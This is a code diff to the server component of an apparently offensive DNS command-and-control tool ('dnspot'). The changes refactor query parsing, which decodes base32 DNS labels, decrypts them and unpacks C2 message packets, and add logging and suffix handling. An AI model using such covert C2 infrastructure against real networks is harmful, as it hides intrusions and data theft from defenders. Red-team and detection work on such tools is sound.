@@ -1,14 +1,17 @@
 package server
 
 import (
+	"bytes"
 	"crypto"
 	"encoding/base32"
-	"fmt"
-	"log"
 	"strings"
 	"time"
 
+	"github.com/kpango/glg"
+	"github.com/lunixbochs/struc"
+
 	"github.com/miekg/dns"
+	"github.com/mosajjal/dnspot/c2"
 	"github.com/mosajjal/dnspot/cryptography"
 	"github.com/spf13/cobra"
 )
@@ -23,26 +26,33 @@ func errorHandler(err error) {
 	}
 }
 
-func parseQuery(m *dns.Msg) {
+func parseQuery(m *dns.Msg) error {
 	for _, q := range m.Question {
 		if strings.HasSuffix(q.Name, dnsSuffix) {
 			q.Name = strings.TrimSuffix(q.Name, dnsSuffix)
 			msgRaw := strings.Replace(q.Name, ".", "", -1)
+			if i := len(msgRaw) % 4; i != 0 {
+				msgRaw += strings.Repeat("=", 4-i)
+			}
 			msg, err := base32.StdEncoding.DecodeString(msgRaw)
 			if err != nil {
-				fmt.Println("error")
+				return err
 			}
-			println("here")
 			decrypted, err := cryptography.Decrypt(privateKeyGlobal, msg)
 			if err != nil {
-
-				panic(err.Error())
+				return err
 			}
-			fmt.Printf("decrypted %x %s", decrypted, string(decrypted))
+			o := c2.MessagePacket{}
+			err = struc.Unpack(bytes.NewBuffer(decrypted), &o)
+			if err != nil {
+				return err
+			}
+			glg.Infof("decrypted: %#v", o)
+			glg.Infof("decrypted: %#d", o.TimeStamp)
 		}
 
 	}
-
+	return nil
 }
 
 func handle53(w dns.ResponseWriter, r *dns.Msg) {
@@ -52,7 +62,10 @@ func handle53(w dns.ResponseWriter, r *dns.Msg) {
 
 	switch r.Opcode {
 	case dns.OpcodeQuery:
-		parseQuery(m)
+		err := parseQuery(m)
+		if err != nil {
+			glg.Warnf("bad request: %s", err)
+		}
 	}
 
 	w.WriteMsg(m)
@@ -65,7 +78,7 @@ func runDns(cmd *cobra.Command) {
 
 	// start server
 	server := &dns.Server{Addr: listenAddress, Net: "udp"}
-	log.Printf("Started DNS on %s -- listening", server.Addr)
+	glg.Infof("Started DNS on %s -- listening", server.Addr)
 	err = server.ListenAndServe()
 	errorHandler(err)
 	defer server.Shutdown()
@@ -82,14 +95,16 @@ func RunServer(cmd *cobra.Command, args []string) {
 
 	dnsSuffix, err = cmd.Flags().GetString("dnsSuffix")
 	errorHandler(err)
-
+	if !strings.HasSuffix(dnsSuffix, ".") {
+		dnsSuffix = dnsSuffix + "."
+	}
+	if !strings.HasPrefix(dnsSuffix, ".") {
+		dnsSuffix = "." + dnsSuffix
+	}
 	go runDns(cmd)
 	timeticker := time.Tick(60 * time.Second)
-	for {
-		select {
-		case <-timeticker:
-			continue
-		}
+	for range timeticker {
+		glg.Infof("All systems are healthy")
 	}
 
 }
